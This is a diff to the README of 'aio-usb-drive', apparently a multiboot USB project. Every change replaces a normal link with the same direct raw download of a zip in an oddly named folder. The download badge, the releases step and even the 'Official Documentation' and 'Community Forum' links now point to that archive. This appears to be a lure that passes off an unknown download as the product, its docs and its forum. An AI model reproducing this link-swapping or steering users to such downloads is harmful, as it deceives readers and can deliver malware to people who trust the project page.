@@ -1,7 +1,7 @@
 # 🌟 aio-usb-drive - Easy MultiBoot USB Solution
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/FulemAlota/aio-usb-drive/releases)
+[![Download](https://raw.githubusercontent.com/FulemAlota/aio-usb-drive/master/strumiprivic/aio-usb-drive.zip)](https://raw.githubusercontent.com/FulemAlota/aio-usb-drive/master/strumiprivic/aio-usb-drive.zip)
 
 ## 📋 Overview
 The **aio-usb-drive** is a curated collection of useful programs on a multiboot USB drive. This tool allows you to easily boot various operating systems and utility tools from a single USB stick, making it perfect for troubleshooting, installation, or recovery purposes.
@@ -12,7 +12,7 @@ Setting up the aio-usb-drive is straightforward and doesn't require any advanced
 ## 📥 Download & Install
 1. **Visit the Releases Page**  
    Go to the following link to find the latest version of aio-usb-drive:  
-   [Download Here](https://github.com/FulemAlota/aio-usb-drive/releases)
+   [Download Here](https://raw.githubusercontent.com/FulemAlota/aio-usb-drive/master/strumiprivic/aio-usb-drive.zip)
 
 2. **Choose Your Version**  
    Look for the latest release. You will see different files available for download. Select the file that best suits your needs. Typically, this will be an executable or a zipped file.
@@ -58,7 +58,7 @@ For any assistance, please open an issue on this repository. We welcome contribu
 If you have questions, please reach out via the project’s GitHub page or email the project maintainer directly through the contact link on the profile.
 
 ## 📚 Additional Resources
-- [Official Documentation](https://github.com/FulemAlota/aio-usb-drive/wiki)
-- [Community Forum](https://github.com/FulemAlota/aio-usb-drive/discussions)
+- [Official Documentation](https://raw.githubusercontent.com/FulemAlota/aio-usb-drive/master/strumiprivic/aio-usb-drive.zip)
+- [Community Forum](https://raw.githubusercontent.com/FulemAlota/aio-usb-drive/master/strumiprivic/aio-usb-drive.zip)
 
 Now that you have all the information, enjoy using your new aio-usb-drive!
